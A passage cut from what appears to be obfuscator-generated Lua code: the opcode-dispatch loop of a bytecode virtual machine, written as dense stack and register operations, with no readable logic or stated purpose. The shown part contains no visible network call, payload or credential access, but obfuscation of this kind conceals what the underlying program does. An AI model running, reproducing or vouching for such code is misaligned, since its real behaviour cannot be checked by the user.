;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];elseif (Enum>95) then local A=Inst[2];local Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;local Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end else local B;local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];do return;end end elseif (Enum<=106) then if (Enum<=101) then if (Enum<=98) then if (Enum>97) then local B;local T;local A;Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];T=Stk[A];B=Inst[3];for Idx=1,B do T[Idx]=Stk[A + Idx ];end else Stk[Inst[2]][Inst[3]]=Inst[4];end elseif (Enum<=99) then Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];elseif (Enum==100) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));else local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=103) then if (Enum==102) then local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local A=Inst[2];local C=Inst[4];local CB=A + 2 ;local Result={Stk[A](Stk[A + 1 ],Stk[CB])};for Idx=1,C do Stk[CB + Idx ]=Result[Idx];end local R=Result[1];if R then Stk[CB]=R;VIP=Inst[3];else VIP=VIP + 1 ;end end elseif (Enum<=104) then local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];elseif (Enum>105) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local A;Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=111) then if (Enum<=108) then if (Enum==107) then local A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Top));else local A=Inst[2];Stk[A]=Stk[A]();end elseif (Enum<=109) then Stk[Inst[2]]=Stk[Inst[3]] -Inst[4] ;elseif (Enum>110) then Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];else Stk[Inst[2]]= #Stk[Inst[3]];end elseif (Enum<=113) then if (Enum>112) then local A;Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];for Idx=Inst[2],Inst[3] do Stk[Idx]=nil;end VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=114) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];elseif (Enum==115) then Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else Stk[Inst[2]]=Wrap(Proto[Inst[3]],nil,Env);end elseif (Enum<=136) then if (Enum<=126) then if (Enum<=121) then if (Enum<=118) then if (Enum>117) then if (Inst[2]<Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end else Stk[Inst[2]]=Stk[Inst[3]] * Stk[Inst[4]] ;end elseif (Enum<=119) then Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];elseif (Enum==120) then local B;local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];else Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=123) then if (Enum==122) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));else local A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));end elseif (Enum<=124) then local B;local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];do return;end elseif (Enum==125) then if (Stk[Inst[2]]<Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local T;local A;local K;local B;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];T=Stk[A];B=Inst[3];for Idx=1,B do T[Idx]=Stk[A + Idx ];end end elseif (Enum<=131) then if (Enum<=128) then if (Enum>127) then local A=Inst[2];do return Stk[A](Unpack(Stk,A + 1 ,Top));end else local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=129) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];if Stk[Inst[2]] then VIP=VIP + 1 ;else VIP=Inst[3];end elseif (Enum>130) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local A=Inst[2];do return Stk[A](Unpack(Stk,A + 1 ,Inst[3]));end end elseif (Enum<=133) then if (Enum>132) then local Results;local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Unpack(Stk,A + 1 ,Top))};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];do return;end end elseif (Enum<=134) then local Edx;local Results;local A;A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Stk[A + 1 ])};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];elseif (Enum==135) then local A;Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=146) then if (Enum<=141) then if (Enum<=138) then if (Enum>137) then local A;local K;local B;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 